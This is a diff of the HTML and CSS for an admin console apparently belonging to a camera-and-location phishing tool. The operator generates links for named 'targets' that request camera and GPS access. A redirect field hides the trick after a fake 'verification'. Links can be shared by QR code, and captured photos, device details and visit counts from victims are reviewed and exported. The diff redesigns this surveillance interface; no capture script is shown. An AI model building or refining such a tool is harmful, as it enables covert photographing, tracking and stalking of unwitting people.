@@ -2,32 +2,46 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Shahid Bashir — Admin Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shahid Bashir — Admin Console</title>
     <style>
         :root {
-            --primary: #007bff;
-            --bg:      #0a0a0a;
-            --card:    #161616;
-            --card2:   #1c1c1c;
-            --text:    #e0e0e0;
-            --border:  #2a2a2a;
-            --green:   #28a745;
-            --red:     #dc3545;
-            --yellow:  #e0a800;
-            --teal:    #17a2b8;
+            --primary: #3b82f6;
+            --primary-dark: #2563eb;
+            --bg:      #080b12;
+            --bg2:     #0d1117;
+            --card:    #111827;
+            --card2:   #161f2e;
+            --card3:   #1c2535;
+            --text:    #e2e8f0;
+            --muted:   #64748b;
+            --border:  #1e293b;
+            --green:   #10b981;
+            --red:     #ef4444;
+            --yellow:  #f59e0b;
+            --teal:    #06b6d4;
+            --purple:  #8b5cf6;
+            --orange:  #f97316;
         }
-        *, *::before, *::after { box-sizing: border-box; }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             background: var(--bg);
             color: var(--text);
-            margin: 0;
-            padding: 20px;
             min-height: 100vh;
         }
 
-        /* ── LOGIN ── */
+        /* ══════════════════════════════════════════════════════════
+           SCROLLBAR
+        ══════════════════════════════════════════════════════════ */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+
+        /* ══════════════════════════════════════════════════════════
+           LOGIN
+        ══════════════════════════════════════════════════════════ */
         #loginOverlay {
             position: fixed; inset: 0;
             background: var(--bg);
@@ -36,433 +50,767 @@
         }
         .login-box {
             background: var(--card);
-            padding: 40px 45px;
-            border-radius: 14px;
-            border: 1px solid #333;
+            padding: 44px 48px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
             text-align: center;
-            min-width: 320px;
+            width: 340px;
+            box-shadow: 0 25px 60px rgba(0,0,0,.6);
         }
-        .login-box h2 { margin: 0 0 20px; font-size: 20px; }
+        .login-logo {
+            width: 52px; height: 52px;
+            background: linear-gradient(135deg, var(--primary), var(--purple));
+            border-radius: 14px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 22px; margin: 0 auto 18px;
+        }
+        .login-box h2 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+        .login-box p  { font-size: 12px; color: var(--muted); margin-bottom: 24px; }
         .login-box input {
             width: 100%; padding: 11px 14px; margin-bottom: 12px;
-            background: #222; border: 1px solid #444; color: #fff;
-            border-radius: 6px; font-size: 14px;
+            background: var(--bg2); border: 1px solid var(--border); color: var(--text);
+            border-radius: 8px; font-size: 14px;
         }
         .login-box input:focus { outline: none; border-color: var(--primary); }
 
+        /* ══════════════════════════════════════════════════════════
+           SIDEBAR + LAYOUT
+        ══════════════════════════════════════════════════════════ */
+        #shell { display: flex; min-height: 100vh; }
+
+        .sidebar {
+            width: 220px; min-height: 100vh;
+            background: var(--card);
+            border-right: 1px solid var(--border);
+            display: flex; flex-direction: column;
+            position: sticky; top: 0; height: 100vh;
+            overflow-y: auto; flex-shrink: 0;
+        }
+        .sidebar-logo {
+            padding: 20px 16px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .sidebar-logo .logo-row {
+            display: flex; align-items: center; gap: 10px;
+        }
+        .logo-icon {
+            width: 34px; height: 34px;
+            background: linear-gradient(135deg, var(--primary), var(--purple));
+            border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 16px; flex-shrink: 0;
+        }
+        .logo-text { font-size: 13px; font-weight: 700; line-height: 1.3; }
+        .logo-sub  { font-size: 10px; color: var(--muted); }
+
+        .nav-section { padding: 12px 10px 4px; }
+        .nav-label { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; padding: 0 8px; margin-bottom: 4px; }
+        .nav-item {
+            display: flex; align-items: center; gap: 9px;
+            padding: 9px 10px; border-radius: 8px;
+            font-size: 13px; cursor: pointer;
+            color: var(--muted); transition: all .15s;
+            border: none; background: none; width: 100%; text-align: left;
+        }
+        .nav-item:hover { background: var(--card2); color: var(--text); }
+        .nav-item.active { background: rgba(59,130,246,.15); color: var(--primary); font-weight: 600; }
+        .nav-item .nav-icon { font-size: 15px; width: 18px; text-align: center; }
+        .nav-badge {
+            margin-left: auto;
+            background: var(--red); color: #fff;
+            border-radius: 10px; padding: 1px 7px; font-size: 10px; font-weight: 700;
+        }
+        .nav-badge-blue { background: var(--primary); }
+
+        .sidebar-footer {
+            margin-top: auto; padding: 12px 10px;
+            border-top: 1px solid var(--border);
+        }
+
+        .main { flex: 1; display: flex; flex-direction: column; min-width: 0; }
+
         /* ── TOP BAR ── */
         .topbar {
-            display: flex; justify-content: space-between; align-items: center;
-            flex-wrap: wrap; gap: 12px; margin-bottom: 22px;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 14px 24px;
+            background: var(--card);
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap; gap: 10px; flex-shrink: 0;
         }
-        .topbar h1 { margin: 0; font-size: 22px; }
+        .topbar-left { display: flex; align-items: center; gap: 12px; }
+        .topbar-left h2 { font-size: 16px; font-weight: 700; }
+        .live-dot {
+            width: 8px; height: 8px; background: var(--green);
+            border-radius: 50%; animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+        .topbar-right { display: flex; gap: 8px; flex-wrap: wrap; }
 
-        /* ── STATS BAR ── */
-        .stats-bar {
+        /* ── CONTENT ── */
+        .content { padding: 22px 24px; flex: 1; }
+
+        /* ── PANELS (tab pages) ── */
+        .panel { display: none; }
+        .panel.active { display: block; }
+
+        /* ══════════════════════════════════════════════════════════
+           STATS
+        ══════════════════════════════════════════════════════════ */
+        .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(155px, 1fr));
             gap: 12px; margin-bottom: 22px;
         }
         .stat-card {
             background: var(--card);
             border: 1px solid var(--border);
-            border-radius: 10px;
+            border-radius: 12px;
             padding: 16px 18px;
-            text-align: center;
         }
-        .stat-card .stat-num { font-size: 28px; font-weight: 700; color: var(--primary); }
-        .stat-card .stat-lbl { font-size: 12px; color: #888; margin-top: 3px; }
+        .stat-card .stat-num { font-size: 30px; font-weight: 800; }
+        .stat-card .stat-lbl { font-size: 11px; color: var(--muted); margin-top: 4px; }
+        .stat-card .stat-icon { font-size: 20px; float: right; opacity: .6; }
+        .stat-blue   .stat-num { color: var(--primary); }
+        .stat-green  .stat-num { color: var(--green); }
+        .stat-yellow .stat-num { color: var(--yellow); }
+        .stat-purple .stat-num { color: var(--purple); }
+        .stat-teal   .stat-num { color: var(--teal); }
+        .stat-red    .stat-num { color: var(--red); }
 
-        /* ── SECTIONS ── */
+        /* ══════════════════════════════════════════════════════════
+           SECTION / CARD
+        ══════════════════════════════════════════════════════════ */
         .section {
             background: var(--card);
             border: 1px solid var(--border);
-            border-radius: 10px;
+            border-radius: 12px;
             padding: 20px;
-            margin-bottom: 22px;
+            margin-bottom: 20px;
         }
         .section-header {
             display: flex; align-items: center; gap: 10px; margin-bottom: 16px;
+            flex-wrap: wrap;
         }
-        .section-header h3 { margin: 0; font-size: 16px; }
+        .section-header h3 { font-size: 15px; font-weight: 700; }
+        .section-header-right { margin-left: auto; display: flex; gap: 8px; flex-wrap: wrap; }
 
         .badge {
-            background: var(--primary); color: #fff;
             border-radius: 20px; padding: 2px 10px;
-            font-size: 11px; font-weight: 700;
+            font-size: 11px; font-weight: 700; color: #fff;
+            background: var(--primary);
         }
-        .badge-red { background: var(--red); }
-        .badge-green { background: var(--green); }
+        .badge-red    { background: var(--red); }
+        .badge-green  { background: var(--green); }
+        .badge-yellow { background: var(--yellow); color: #000; }
+        .badge-gray   { background: #334155; }
 
-        /* ── CONTROLS ── */
-        .controls {
+        /* ══════════════════════════════════════════════════════════
+           FORMS / INPUTS
+        ══════════════════════════════════════════════════════════ */
+        .form-row {
             display: flex; gap: 10px; flex-wrap: wrap; align-items: center;
             margin-bottom: 14px;
         }
         input[type="text"],
         input[type="password"],
-        select {
+        input[type="url"],
+        select, textarea {
             padding: 9px 12px;
-            background: #222;
-            border: 1px solid #444;
-            color: #fff;
-            border-radius: 6px;
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            border-radius: 8px;
             font-size: 13px;
+            font-family: inherit;
         }
-        input[type="text"]:focus,
-        input[type="password"]:focus,
-        select:focus { outline: none; border-color: var(--primary); }
+        input:focus, select:focus, textarea:focus {
+            outline: none; border-color: var(--primary);
+        }
+        .check-label {
+            display: flex; align-items: center; gap: 6px;
+            cursor: pointer; font-size: 13px; color: var(--text);
+            user-select: none;
+        }
+        .check-label input[type="checkbox"] { accent-color: var(--primary); }
 
-        /* ── BUTTONS ── */
+        /* ══════════════════════════════════════════════════════════
+           BUTTONS
+        ══════════════════════════════════════════════════════════ */
         .btn {
-            padding: 8px 13px;
-            border: none; border-radius: 6px;
-            cursor: pointer; font-weight: 700; font-size: 12px;
-            transition: opacity .2s, transform .1s;
-            white-space: nowrap;
+            padding: 8px 14px; border: none; border-radius: 8px;
+            cursor: pointer; font-weight: 600; font-size: 12px;
+            transition: all .15s; white-space: nowrap; font-family: inherit;
+            display: inline-flex; align-items: center; gap: 5px;
         }
-        .btn:hover  { opacity: .85; }
+        .btn:hover  { filter: brightness(1.1); }
         .btn:active { transform: scale(.97); }
-        .btn-blue   { background: var(--primary); color: #fff; }
-        .btn-red    { background: var(--red);     color: #fff; }
-        .btn-green  { background: var(--green);   color: #fff; }
-        .btn-gray   { background: #444;           color: #fff; }
-        .btn-yellow { background: var(--yellow);  color: #000; }
-        .btn-teal   { background: var(--teal);    color: #fff; }
-        .btn-purple { background: #6f42c1;        color: #fff; }
+        .btn-primary { background: var(--primary);      color: #fff; }
+        .btn-red     { background: var(--red);          color: #fff; }
+        .btn-green   { background: var(--green);        color: #fff; }
+        .btn-gray    { background: #1e293b;             color: var(--text); border: 1px solid var(--border); }
+        .btn-yellow  { background: var(--yellow);       color: #000; }
+        .btn-teal    { background: var(--teal);         color: #fff; }
+        .btn-purple  { background: var(--purple);       color: #fff; }
+        .btn-orange  { background: var(--orange);       color: #fff; }
+        .btn-sm { padding: 5px 10px; font-size: 11px; border-radius: 6px; }
 
-        /* ── TABLE ── */
-        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        /* ══════════════════════════════════════════════════════════
+           TABLE
+        ══════════════════════════════════════════════════════════ */
+        .table-wrap { overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 600px; }
         thead th {
-            color: #999; font-weight: 600;
+            color: var(--muted); font-weight: 600;
             padding: 9px 12px;
             border-bottom: 1px solid var(--border);
-            text-align: left;
+            text-align: left; white-space: nowrap;
         }
         tbody td {
             padding: 10px 12px;
-            border-bottom: 1px solid #1e1e1e;
+            border-bottom: 1px solid #1a2235;
             vertical-align: middle;
         }
         tbody tr:last-child td { border-bottom: none; }
+        tbody tr:hover td { background: rgba(255,255,255,.02); }
         .status-active   { color: var(--green); font-weight: 700; }
         .status-inactive { color: var(--red);   font-weight: 700; }
 
-        /* ── LOG GRID ── */
-        .grid {
+        /* ══════════════════════════════════════════════════════════
+           CAPTURE GRID
+        ══════════════════════════════════════════════════════════ */
+        .cap-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(295px, 1fr));
-            gap: 15px;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 14px;
         }
-
-        /* ── LOG CARD ── */
         .log-card {
             background: var(--card2);
             border: 1px solid var(--border);
-            border-radius: 10px;
+            border-radius: 12px;
             overflow: hidden;
+            display: flex; flex-direction: column;
+            transition: border-color .2s;
         }
-        .log-card .card-img { position: relative; }
-        .log-card .card-img img {
+        .log-card:hover { border-color: #334155; }
+        .card-img { position: relative; cursor: zoom-in; }
+        .card-img img {
             width: 100%; display: block;
-            height: 160px; object-fit: cover;
+            height: 155px; object-fit: cover;
             object-position: center top;
         }
-        .log-card .no-img {
-            height: 140px; background: #252525;
+        .card-img .no-img {
+            height: 100px; background: var(--card3);
             display: flex; align-items: center; justify-content: center;
-            color: #555; font-size: 13px;
+            color: var(--muted); font-size: 12px; flex-direction: column; gap: 4px;
         }
-        .log-card .card-body { padding: 12px; }
-        .log-card p { margin: 5px 0; font-size: 13px; line-height: 1.4; }
-        .log-card .meta { font-size: 11px; color: #777; }
-
-        /* device info panel */
+        .card-img .img-overlay {
+            position: absolute; inset: 0;
+            background: rgba(0,0,0,.0);
+            display: flex; align-items: center; justify-content: center;
+            opacity: 0; transition: all .2s; font-size: 22px;
+        }
+        .card-img:hover .img-overlay { opacity: 1; background: rgba(0,0,0,.35); }
+        .card-img .img-badge {
+            position: absolute; top: 8px; right: 8px;
+            background: rgba(0,0,0,.65); color: #fff;
+            border-radius: 6px; padding: 2px 7px; font-size: 10px; font-weight: 700;
+        }
+        .card-body { padding: 12px; flex: 1; }
+        .card-body p { margin: 4px 0; font-size: 12.5px; line-height: 1.4; }
+        .card-body .meta { font-size: 11px; color: var(--muted); }
+        .card-body .tag {
+            display: inline-block;
+            background: rgba(59,130,246,.15); color: var(--primary);
+            border-radius: 4px; padding: 1px 6px; font-size: 10px; font-weight: 600;
+            margin-right: 4px;
+        }
         .device-panel {
-            background: #111;
-            border-radius: 6px;
-            padding: 10px 12px;
-            margin-top: 8px;
-            font-size: 11px;
-            color: #aaa;
-            display: none;
+            background: var(--bg2); border-radius: 8px;
+            padding: 10px 12px; margin-top: 8px;
+            font-size: 11px; color: #94a3b8;
+            display: none; border: 1px solid var(--border);
         }
-        .device-panel div { margin: 3px 0; }
-        .device-panel span { color: #ddd; }
-
-        /* card action row */
+        .device-panel .dp-row { display: flex; justify-content: space-between; padding: 2px 0; }
+        .device-panel .dp-key { color: var(--muted); }
+        .device-panel .dp-val { color: var(--text); font-weight: 500; max-width: 65%; text-align: right; word-break: break-all; }
         .card-actions {
             display: flex; flex-wrap: wrap; gap: 5px;
             padding: 10px 12px 12px;
             border-top: 1px solid var(--border);
         }
-        .card-actions .btn { flex: 1; text-align: center; padding: 7px 8px; }
+        .card-actions .btn { flex: 1; text-align: center; justify-content: center; }
 
-        /* ── BIN CARD ── */
+        /* ══════════════════════════════════════════════════════════
+           UNIFIED RECYCLE BIN
+        ══════════════════════════════════════════════════════════ */
+        .bin-filter-bar {
+            display: flex; gap: 8px; flex-wrap: wrap; align-items: center;
+            margin-bottom: 14px; padding-bottom: 14px;
+            border-bottom: 1px solid var(--border);
+        }
+        .bin-type-tabs { display: flex; gap: 4px; }
+        .bin-tab {
+            padding: 6px 14px; border-radius: 8px; font-size: 12px; font-weight: 600;
+            cursor: pointer; border: 1px solid var(--border); background: var(--bg2);
+            color: var(--muted); transition: all .15s;
+        }
+        .bin-tab.active { background: var(--primary); border-color: var(--primary); color: #fff; }
+
+        /* Bin cards use capture-card style */
         .bin-card {
-            background: #1a0e0e;
-            border: 1px solid #3d2020;
-            border-radius: 10px;
+            background: var(--card2);
+            border: 1px solid #2d1a1a;
+            border-radius: 12px;
             overflow: hidden;
+            display: flex; flex-direction: column;
+            opacity: .9;
         }
-        .bin-card .bin-img img {
-            width: 100%; display: block;
-            height: 130px; object-fit: cover;
-            object-position: center top;
-            opacity: 0.75;
-            filter: grayscale(30%);
-        }
-        .bin-card .bin-img .no-img {
-            height: 80px; background: #1e1010;
-            display: flex; align-items: center; justify-content: center;
-            color: #555; font-size: 12px;
-        }
-        .bin-card .bin-body { padding: 10px 12px; }
-        .bin-card p { margin: 4px 0; font-size: 13px; }
-        .bin-card .meta { font-size: 11px; color: #777; }
+        .bin-card .card-img img  { height: 130px; filter: grayscale(25%) brightness(.85); }
+        .bin-card .card-img .no-img { height: 80px; }
 
-        /* link bin card */
-        .link-bin-card {
-            background: #0e1a0e;
-            border: 1px solid #1e3d1e;
-            border-radius: 10px;
-            overflow: hidden;
+        /* Link bin card */
+        .lbin-card {
+            background: var(--card2);
+            border: 1px solid #1a2d1a;
+            border-radius: 12px;
+            padding: 14px 16px;
         }
-        .link-bin-card .bin-body { padding: 12px 14px; }
-        .link-bin-card p { margin: 4px 0; font-size: 13px; }
-        .link-bin-card .meta { font-size: 11px; color: #777; }
+        .lbin-card p  { margin: 4px 0; font-size: 13px; }
+        .lbin-card .meta { font-size: 11px; color: var(--muted); }
 
-        /* ── RENAME / EDIT PERMISSIONS MODAL ── */
-        #editLinkModal {
+        /* ══════════════════════════════════════════════════════════
+           LIGHTBOX
+        ══════════════════════════════════════════════════════════ */
+        #lightbox {
+            position: fixed; inset: 0; z-index: 9998;
+            background: rgba(0,0,0,.92);
+            display: none; align-items: center; justify-content: center;
+            flex-direction: column; gap: 14px;
+        }
+        #lightbox img {
+            max-width: 90vw; max-height: 80vh;
+            border-radius: 10px; box-shadow: 0 0 60px rgba(0,0,0,.8);
+        }
+        #lightbox .lb-info { color: #aaa; font-size: 13px; text-align: center; }
+        #lightboxClose {
+            position: absolute; top: 16px; right: 20px;
+            color: #fff; font-size: 28px; cursor: pointer;
+            background: none; border: none; line-height: 1;
+        }
+
+        /* ══════════════════════════════════════════════════════════
+           MODALS
+        ══════════════════════════════════════════════════════════ */
+        .modal-overlay {
             position: fixed; inset: 0;
             background: rgba(0,0,0,.75);
             display: none; align-items: center; justify-content: center;
-            z-index: 8500;
-        }
-        #editLinkModal .modal-box {
-            background: var(--card);
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 28px 32px;
-            min-width: 320px; text-align: left;
-        }
-        #editLinkModal h3 { margin: 0 0 18px; font-size: 16px; }
-        #editLinkModal label { display: block; font-size: 13px; margin-bottom: 6px; color: #bbb; }
-        #editLinkModal input[type="text"] { width: 100%; margin-bottom: 14px; }
-        .perm-row { display: flex; gap: 18px; margin-bottom: 18px; }
-        .perm-row label { display: flex; align-items: center; gap: 6px; cursor: pointer; color: #ddd; margin: 0; }
-
-        /* ── NOTIFICATION TOAST ── */
-        #toast {
-            position: fixed; bottom: 24px; right: 24px;
-            background: #222; border: 1px solid #444;
-            border-left: 4px solid var(--primary);
-            color: #fff; padding: 14px 18px;
-            border-radius: 8px; font-size: 13px;
-            display: none; z-index: 9000;
-            box-shadow: 0 4px 20px rgba(0,0,0,.5);
-            max-width: 320px;
-            animation: slideIn .3s ease;
-        }
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
-
-        /* ── EMPTY STATE ── */
-        .empty {
-            text-align: center; color: #555;
-            padding: 30px; font-size: 13px;
-            grid-column: 1/-1;
-        }
-
-        /* ── FILTER BAR ── */
-        .filter-bar {
-            display: flex; gap: 10px; flex-wrap: wrap;
-            align-items: center; margin-bottom: 14px;
-        }
-
-        /* ── PASSWORD MODAL ── */
-        #pwModal {
-            position: fixed; inset: 0;
-            background: rgba(0,0,0,.7);
-            display: none; align-items: center; justify-content: center;
             z-index: 8000;
         }
-        #pwModal .modal-box {
+        .modal-overlay.open { display: flex; }
+        .modal-box {
             background: var(--card);
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 30px 35px;
-            min-width: 300px; text-align: center;
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 28px 32px;
+            width: 380px; max-width: 95vw;
         }
-        #pwModal h3 { margin: 0 0 16px; }
-        #pwModal input { width: 100%; margin-bottom: 10px; }
+        .modal-box h3 { font-size: 16px; font-weight: 700; margin-bottom: 18px; }
+        .modal-box label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 5px; margin-top: 12px; }
+        .modal-box input[type="text"],
+        .modal-box input[type="password"],
+        .modal-box input[type="url"] { width: 100%; }
+        .modal-row { display: flex; gap: 8px; margin-top: 18px; }
+        .modal-row .btn { flex: 1; justify-content: center; }
+        .perm-row { display: flex; gap: 18px; margin-top: 10px; flex-wrap: wrap; }
+
+        /* QR Modal */
+        #qrModal .modal-box { text-align: center; }
+        #qrCanvas { margin: 12px auto; display: block; border-radius: 8px; }
+        #qrUrlText {
+            font-size: 11px; color: var(--muted);
+            word-break: break-all; margin-top: 8px;
+            background: var(--bg2); padding: 8px; border-radius: 6px;
+        }
+
+        /* ══════════════════════════════════════════════════════════
+           TOAST
+        ══════════════════════════════════════════════════════════ */
+        #toastStack {
+            position: fixed; bottom: 20px; right: 20px;
+            display: flex; flex-direction: column; gap: 8px;
+            z-index: 9000; max-width: 320px;
+        }
+        .toast-item {
+            background: var(--card3); border: 1px solid var(--border);
+            border-left: 4px solid var(--primary);
+            color: var(--text); padding: 12px 16px;
+            border-radius: 10px; font-size: 13px;
+            box-shadow: 0 4px 20px rgba(0,0,0,.5);
+            animation: toastIn .25s ease;
+        }
+        @keyframes toastIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:none} }
+
+        /* ══════════════════════════════════════════════════════════
+           EMPTY / MISC
+        ══════════════════════════════════════════════════════════ */
+        .empty {
+            text-align: center; color: var(--muted);
+            padding: 40px 20px; font-size: 13px;
+            grid-column: 1/-1;
+        }
+        .empty .empty-icon { font-size: 32px; display: block; margin-bottom: 10px; }
+
+        .filter-bar {
+            display: flex; gap: 8px; flex-wrap: wrap;
+            align-items: center; margin-bottom: 14px;
+        }
+        .filter-bar input[type="text"] { min-width: 180px; }
+
+        /* ── LINK URL PREVIEW ── */
+        .url-preview {
+            background: var(--bg2); border: 1px solid var(--border);
+            border-radius: 8px; padding: 8px 12px;
+            font-size: 11px; color: var(--muted);
+            display: flex; align-items: center; gap: 8px;
+            margin-top: 10px;
+        }
+        .url-preview span { flex: 1; word-break: break-all; }
+
+        /* Responsive */
+        @media (max-width: 700px) {
+            .sidebar { display: none; }
+            .content { padding: 14px; }
+        }
     </style>
 </head>
 <body>
 
-<!-- ── LOGIN OVERLAY ───────────────────────────────────────────────────── -->
+<!-- ══════════════════════════════════════════════════════════
+     LOGIN
+══════════════════════════════════════════════════════════ -->
 <div id="loginOverlay">
     <div class="login-box">
-        <h2>🔒 Admin Login</h2>
-        <input type="password" id="adminPass" placeholder="Enter admin password">
-        <button class="btn btn-blue" id="loginBtn" style="width:100%;padding:11px;font-size:14px;">
-            Access Dashboard
+        <div class="login-logo">🛡️</div>
+        <h2>Shahid Bashir</h2>
+        <p>Admin Control Panel — Secure Access</p>
+        <input type="password" id="adminPass" placeholder="Enter admin password" autocomplete="current-password">
+        <button class="btn btn-primary" id="loginBtn" style="width:100%;padding:11px;font-size:14px;justify-content:center;">
+            🔓 Access Dashboard
         </button>
-        <p id="loginError" style="color:var(--red);font-size:12px;margin-top:8px;display:none;">
-            ❌ Incorrect password
+        <p id="loginError" style="color:var(--red);font-size:12px;margin-top:10px;display:none;">
+            ❌ Incorrect password. Try again.
         </p>
     </div>
 </div>
 
-<!-- ── EDIT LINK MODAL (rename + permissions) ────────────────────────── -->
-<div id="editLinkModal">
+<!-- ══════════════════════════════════════════════════════════
+     LIGHTBOX
+══════════════════════════════════════════════════════════ -->
+<div id="lightbox">
+    <button id="lightboxClose">✕</button>
+    <img id="lightboxImg" src="" alt="">
+    <div class="lb-info" id="lightboxInfo"></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
+     MODALS
+══════════════════════════════════════════════════════════ -->
+
+<!-- Edit Link Modal -->
+<div id="editLinkModal" class="modal-overlay">
     <div class="modal-box">
         <h3>✏️ Edit Link</h3>
-        <label>Link Name</label>
-        <input type="text" id="editLinkName" placeholder="Target Name">
+        <label>Link Name / Target</label>
+        <input type="text" id="editLinkName" placeholder="e.g. Target Name">
+        <label>Redirect URL (after verification)</label>
+        <input type="url" id="editRedirect" placeholder="https://example.com">
         <label>Permissions</label>
         <div class="perm-row">
-            <label><input type="checkbox" id="editCam"> 📷 Camera</label>
-            <label><input type="checkbox" id="editGPS"> 📍 GPS</label>
+            <label class="check-label"><input type="checkbox" id="editCam"> 📷 Camera</label>
+            <label class="check-label"><input type="checkbox" id="editGPS"> 📍 GPS</label>
         </div>
-        <div style="display:flex;gap:8px;margin-top:4px;">
-            <button class="btn btn-blue"  id="saveEditLink"  style="flex:1;">💾 Save Changes</button>
-            <button class="btn btn-gray"  id="closeEditLink" style="flex:1;">Cancel</button>
+        <div class="modal-row">
+            <button class="btn btn-primary" id="saveEditLink">💾 Save</button>
+            <button class="btn btn-gray"    id="closeEditLink">Cancel</button>
         </div>
     </div>
 </div>
 
-<!-- ── PASSWORD CHANGE MODAL ──────────────────────────────────────────── -->
-<div id="pwModal">
+<!-- Password Modal -->
+<div id="pwModal" class="modal-overlay">
     <div class="modal-box">
         <h3>🔐 Change Password</h3>
-        <input type="password" id="oldPw"  placeholder="Current password">
-        <input type="password" id="newPw"  placeholder="New password">
-        <input type="password" id="newPw2" placeholder="Confirm new password">
-        <div style="display:flex;gap:8px;margin-top:6px;">
-            <button class="btn btn-blue"  id="savePwBtn"   style="flex:1;">Save</button>
-            <button class="btn btn-gray"  id="closePwModal" style="flex:1;">Cancel</button>
+        <label>Current Password</label>
+        <input type="password" id="oldPw" placeholder="Current password">
+        <label>New Password</label>
+        <input type="password" id="newPw" placeholder="New password (min 4 chars)">
+        <label>Confirm New Password</label>
+        <input type="password" id="newPw2" placeholder="Confirm password">
+        <div class="modal-row">
+            <button class="btn btn-primary" id="savePwBtn">Save</button>
+            <button class="btn btn-gray"    id="closePwModal">Cancel</button>
         </div>
-        <p id="pwMsg" style="font-size:12px;margin-top:8px;"></p>
+        <p id="pwMsg" style="font-size:12px;margin-top:10px;"></p>
     </div>
 </div>
 
-<!-- ── TOAST NOTIFICATION ──────────────────────────────────────────────── -->
-<div id="toast"></div>
-
-<!-- ── TOP BAR ─────────────────────────────────────────────────────────── -->
-<div class="topbar">
-    <h1>⚡ Shahid Bashir — Admin Console</h1>
-    <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
-        <button class="btn btn-teal"   id="exportBtn">📥 Export CSV</button>
-        <button class="btn btn-purple" id="changePwBtn">🔐 Password</button>
-        <button class="btn btn-gray"   id="refreshBtn">🔄 Refresh</button>
+<!-- QR Code Modal -->
+<div id="qrModal" class="modal-overlay">
+    <div class="modal-box" id="qrModal">
+        <h3>📱 Share Link via QR</h3>
+        <canvas id="qrCanvas" width="200" height="200"></canvas>
+        <div id="qrUrlText"></div>
+        <div class="modal-row">
+            <button class="btn btn-teal"    id="downloadQrBtn">⬇️ Download QR</button>
+            <button class="btn btn-gray"    id="closeQrModal">Close</button>
+        </div>
     </div>
 </div>
 
-<!-- ── STATS BAR ────────────────────────────────────────────────────────── -->
-<div class="stats-bar">
-    <div class="stat-card">
-        <div class="stat-num" id="statTotal">0</div>
-        <div class="stat-lbl">Total Captures</div>
-    </div>
-    <div class="stat-card">
-        <div class="stat-num" id="statToday">0</div>
-        <div class="stat-lbl">Captures Today</div>
-    </div>
-    <div class="stat-card">
-        <div class="stat-num" id="statLinks">0</div>
-        <div class="stat-lbl">Active Links</div>
-    </div>
-    <div class="stat-card">
-        <div class="stat-num" id="statVisits">0</div>
-        <div class="stat-lbl">Total Link Visits</div>
-    </div>
-</div>
+<!-- Toast Container -->
+<div id="toastStack"></div>
 
-<!-- ── CREATE LINK ──────────────────────────────────────────────────────── -->
-<div class="section">
-    <div class="section-header">
-        <h3>🔗 Manage Links</h3>
-        <span class="badge badge-green" id="linkCount">0</span>
-    </div>
-    <div class="controls">
-        <input type="text" id="linkName" placeholder="Target Name (e.g., Shahid)" style="width:200px;">
-        <label style="display:flex;align-items:center;gap:5px;cursor:pointer;">
-            <input type="checkbox" id="checkCam" checked> 📷 Camera
-        </label>
-        <label style="display:flex;align-items:center;gap:5px;cursor:pointer;">
-            <input type="checkbox" id="checkGPS" checked> 📍 GPS
-        </label>
-        <button class="btn btn-blue" id="createBtn">⚡ Generate Link</button>
-    </div>
-    <table>
-        <thead>
-            <tr>
-                <th>Target Name</th>
-                <th>Permissions</th>
-                <th>Status</th>
-                <th>👁 Visits</th>
-                <th>Created</th>
-                <th>Actions</th>
-            </tr>
-        </thead>
-        <tbody id="linkTableBody"></tbody>
-    </table>
-</div>
+<!-- ══════════════════════════════════════════════════════════
+     MAIN SHELL
+══════════════════════════════════════════════════════════ -->
+<div id="shell">
 
-<!-- ── LIVE LOGS ────────────────────────────────────────────────────────── -->
-<div class="section">
-    <div class="section-header">
-        <h3>📸 Live Captures</h3>
-        <span class="badge" id="logCount">0</span>
-    </div>
-    <div class="filter-bar">
-        <input type="text" id="searchLogs" placeholder="🔍 Search by name..." style="width:200px;">
-        <select id="timeFilter">
-            <option value="all">All Time</option>
-            <option value="today">Today</option>
-            <option value="week">This Week</option>
-        </select>
-    </div>
-    <div id="photoGrid" class="grid"></div>
-</div>
+    <!-- SIDEBAR -->
+    <nav class="sidebar">
+        <div class="sidebar-logo">
+            <div class="logo-row">
+                <div class="logo-icon">🛡️</div>
+                <div>
+                    <div class="logo-text">Shahid Bashir</div>
+                    <div class="logo-sub">Admin Console</div>
+                </div>
+            </div>
+        </div>
 
-<!-- ── LOG RECYCLE BIN ──────────────────────────────────────────────────── -->
-<div class="section" style="border-color:#3d2020;">
-    <div class="section-header">
-        <h3>🗑️ Log Recycle Bin</h3>
-        <span class="badge badge-red" id="binCount">0</span>
-    </div>
-    <p style="font-size:11px;color:#666;margin:0 0 10px;">
-        Deleted captures. Local to this browser. Auto-removed after 30 days.
-    </p>
-    <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:12px;">
